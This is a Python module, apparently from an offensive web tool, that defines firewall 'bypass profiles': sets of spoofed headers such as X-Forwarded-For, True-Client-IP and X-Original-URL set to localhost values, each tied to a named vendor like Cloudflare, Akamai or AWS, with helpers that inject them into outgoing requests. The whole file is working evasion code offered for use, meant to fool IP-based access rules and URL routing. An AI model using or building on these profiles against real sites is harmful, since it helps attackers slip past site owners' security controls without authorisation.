"""WAF Bypass Profile system for evading web application firewalls"""

from dataclasses import dataclass, field
from typing import Dict, List, Optional


@dataclass
class WAFBypassProfile:
    """
    WAF bypass profile containing pre-configured header sets.
    
    Each profile is designed to evade specific WAF vendors by manipulating
    headers that the WAF uses for IP detection and request routing.
    """
    
    name: str
    description: str
    headers: Dict[str, str] = field(default_factory=dict)
    vendor: Optional[str] = None
    effectiveness: Optional[str] = None  # high, medium, low
    
    def apply_to_headers(self, existing_headers: Dict[str, str]) -> Dict[str, str]:
        """
        Apply WAF bypass headers to existing headers.
        
        Args:
            existing_headers: Current request headers
            
        Returns:
            Updated headers with WAF bypass headers applied
        """
        # Create a copy to avoid modifying the original
        updated_headers = existing_headers.copy()
        
        # Apply bypass headers (they override existing ones)
        updated_headers.update(self.headers)
        
        return updated_headers


class WAFProfileManager:
    """
    Manages WAF bypass profiles and provides access to pre-configured profiles.
    """
    
    # Pre-configured profiles for common WAFs
    BUILTIN_PROFILES = {
        "cloudflare": WAFBypassProfile(
            name="cloudflare",
            description="Bypass profile for Cloudflare WAF",
            vendor="Cloudflare",
            effectiveness="medium",
            headers={
                "CF-Connecting-IP": "127.0.0.1",
                "X-Forwarded-For": "127.0.0.1",
                "X-Forwarded-Host": "127.0.0.1",
                "X-Original-URL": "/",
                "X-Rewrite-URL": "/",
            }
        ),
        "akamai": WAFBypassProfile(
            name="akamai",
            description="Bypass profile for Akamai WAF",
            vendor="Akamai",
            effectiveness="medium",
            headers={
                "X-Forwarded-For": "127.0.0.1",
                "True-Client-IP": "127.0.0.1",
                "X-Real-IP": "127.0.0.1",
                "X-Original-URL": "/",
            }
        ),
        "aws_waf": WAFBypassProfile(
            name="aws_waf",
            description="Bypass profile for AWS WAF",
            vendor="AWS",
            effectiveness="medium",
            headers={
                "X-Forwarded-For": "127.0.0.1",
                "X-Real-IP": "127.0.0.1",
                "X-Originating-IP": "127.0.0.1",
                "X-Remote-IP": "127.0.0.1",
            }
        ),
        "modsecurity": WAFBypassProfile(
            name="modsecurity",
            description="Bypass profile for ModSecurity WAF",
            vendor="ModSecurity",
            effectiveness="medium",
            headers={
                "X-Forwarded-For": "127.0.0.1",
                "X-Originating-IP": "127.0.0.1",
                "X-Remote-IP": "127.0.0.1",
                "X-Remote-Addr": "127.0.0.1",
            }
        ),
        "imperva": WAFBypassProfile(
            name="imperva",
            description="Bypass profile for Imperva (Incapsula) WAF",
            vendor="Imperva",
            effectiveness="medium",
            headers={
                "X-Forwarded-For": "127.0.0.1",
                "X-Real-IP": "127.0.0.1",
                "X-Client-IP": "127.0.0.1",
                "Incap-Client-IP": "127.0.0.1",
            }
        ),
        "f5_bigip": WAFBypassProfile(
            name="f5_bigip",
            description="Bypass profile for F5 BIG-IP ASM",
            vendor="F5",
            effectiveness="medium",
            headers={
                "X-Forwarded-For": "127.0.0.1",
                "X-Real-IP": "127.0.0.1",
                "X-Client-IP": "127.0.0.1",
                "X-Originating-IP": "127.0.0.1",
            }
        ),
        "fortiweb": WAFBypassProfile(
            name="fortiweb",
            description="Bypass profile for FortiWeb WAF",
            vendor="Fortinet",
            effectiveness="medium",
            headers={
                "X-Forwarded-For": "127.0.0.1",
                "X-Real-IP": "127.0.0.1",
                "X-Originating-IP": "127.0.0.1",
                "Client-IP": "127.0.0.1",
            }
        ),
        "barracuda": WAFBypassProfile(
            name="barracuda",
            description="Bypass profile for Barracuda WAF",
            vendor="Barracuda",
            effectiveness="medium",
            headers={
                "X-Forwarded-For": "127.0.0.1",
                "X-Real-IP": "127.0.0.1",
                "X-Client-IP": "127.0.0.1",
                "X-Remote-IP": "127.0.0.1",
            }
        ),
        "generic": WAFBypassProfile(
            name="generic",
            description="Generic bypass profile for unknown WAFs",
            vendor="Generic",
            effectiveness="low",
            headers={
                "X-Forwarded-For": "127.0.0.1",
                "X-Real-IP": "127.0.0.1",
                "X-Originating-IP": "127.0.0.1",
                "X-Remote-IP": "127.0.0.1",
                "X-Client-IP": "127.0.0.1",
                "X-Remote-Addr": "127.0.0.1",
                "X-Original-URL": "/",
                "X-Rewrite-URL": "/",
                "True-Client-IP": "127.0.0.1",
                "Client-IP": "127.0.0.1",
            }
        ),
        "aggressive": WAFBypassProfile(
            name="aggressive",
            description="Aggressive bypass with multiple header variations",
            vendor="Generic",
            effectiveness="high",
            headers={
                # IP spoofing headers
                "X-Forwarded-For": "127.0.0.1, 127.0.0.1",
                "X-Real-IP": "127.0.0.1",
                "X-Originating-IP": "127.0.0.1",
                "X-Remote-IP": "127.0.0.1",
                "X-Client-IP": "127.0.0.1",
                "X-Remote-Addr": "127.0.0.1",
                "True-Client-IP": "127.0.0.1",
                "Client-IP": "127.0.0.1",
                "CF-Connecting-IP": "127.0.0.1",
                "Incap-Client-IP": "127.0.0.1",
                # URL rewriting headers
                "X-Original-URL": "/",
                "X-Rewrite-URL": "/",
                "X-Original-Path": "/",
                # Host manipulation
                "X-Forwarded-Host": "127.0.0.1",
                "X-Host": "127.0.0.1",
                # Protocol manipulation
                "X-Forwarded-Proto": "https",
                "X-Forwarded-Protocol": "https",
                "X-Url-Scheme": "https",
                # Additional bypass headers
                "X-Custom-IP-Authorization": "127.0.0.1",
                "X-Forwarded-Server": "127.0.0.1",
            }
        ),
    }
    
    def __init__(self):
        """Initialize WAF profile manager with built-in profiles"""
        self._profiles: Dict[str, WAFBypassProfile] = self.BUILTIN_PROFILES.copy()
        self._custom_profiles: Dict[str, WAFBypassProfile] = {}
    
    def get_profile(self, name: str) -> Optional[WAFBypassProfile]:
        """
        Get a WAF bypass profile by name.
        
        Args:
            name: Profile name
            
        Returns:
            WAFBypassProfile if found, None otherwise
        """
        # Check custom profiles first
        if name in self._custom_profiles:
            return self._custom_profiles[name]
        
        # Then check built-in profiles
        return self._profiles.get(name)
    
    def list_profiles(self) -> List[str]:
        """
        List all available profile names.
        
        Returns:
            List of profile names
        """
        builtin = list(self._profiles.keys())
        custom = list(self._custom_profiles.keys())
        return builtin + custom
    
    def list_builtin_profiles(self) -> List[str]:
        """
        List built-in profile names.
        
        Returns:
            List of built-in profile names
        """
        return list(self._profiles.keys())
    
    def list_custom_profiles(self) -> List[str]:
        """
        List custom profile names.
        
        Returns:
            List of custom profile names
        """
        return list(self._custom_profiles.keys())
    
    def add_custom_profile(self, profile: WAFBypassProfile):
        """
        Add a custom WAF bypass profile.
        
        Args:
            profile: WAFBypassProfile to add
        """
        self._custom_profiles[profile.name] = profile
    
    def remove_custom_profile(self, name: str) -> bool:
        """
        Remove a custom profile.
        
        Args:
            name: Profile name to remove
            
        Returns:
            True if removed, False if not found
        """
        if name in self._custom_profiles:
            del self._custom_profiles[name]
            return True
        return False
    
    def get_profile_info(self, name: str) -> Optional[Dict[str, str]]:
        """
        Get information about a profile.
        
        Args:
            name: Profile name
            
        Returns:
            Dictionary with profile information or None if not found
        """
        profile = self.get_profile(name)
        if not profile:
            return None
        
        return {
            "name": profile.name,
            "description": profile.description,
            "vendor": profile.vendor or "Unknown",
            "effectiveness": profile.effectiveness or "Unknown",
            "header_count": len(profile.headers),
        }
    
    def apply_profile_to_headers(
        self,
        profile_name: str,
        existing_headers: Dict[str, str]
    ) -> Dict[str, str]:
        """
        Apply a WAF bypass profile to existing headers.
        
        Args:
            profile_name: Name of the profile to apply
            existing_headers: Current request headers
            
        Returns:
            Updated headers with bypass profile applied
            
        Raises:
            ValueError: If profile not found
        """
        profile = self.get_profile(profile_name)
        if not profile:
            raise ValueError(f"WAF bypass profile '{profile_name}' not found")
        
        return profile.apply_to_headers(existing_headers)


# Global instance for easy access
waf_profile_manager = WAFProfileManager()


def get_waf_profile(name: str) -> Optional[WAFBypassProfile]:
    """
    Get a WAF bypass profile by name (convenience function).
    
    Args:
        name: Profile name
        
    Returns:
        WAFBypassProfile if found, None otherwise
    """
    return waf_profile_manager.get_profile(name)


def list_waf_profiles() -> List[str]:
    """
    List all available WAF bypass profiles (convenience function).
    
    Returns:
        List of profile names
    """
    return waf_profile_manager.list_profiles()


def apply_waf_profile(
    profile_name: str,
    headers: Dict[str, str]
) -> Dict[str, str]:
    """
    Apply a WAF bypass profile to headers (convenience function).
    
    Args:
        profile_name: Name of the profile to apply
        headers: Current request headers
        
    Returns:
        Updated headers with bypass profile applied
        
    Raises:
        ValueError: If profile not found
    """
    return waf_profile_manager.apply_profile_to_headers(profile_name, headers)
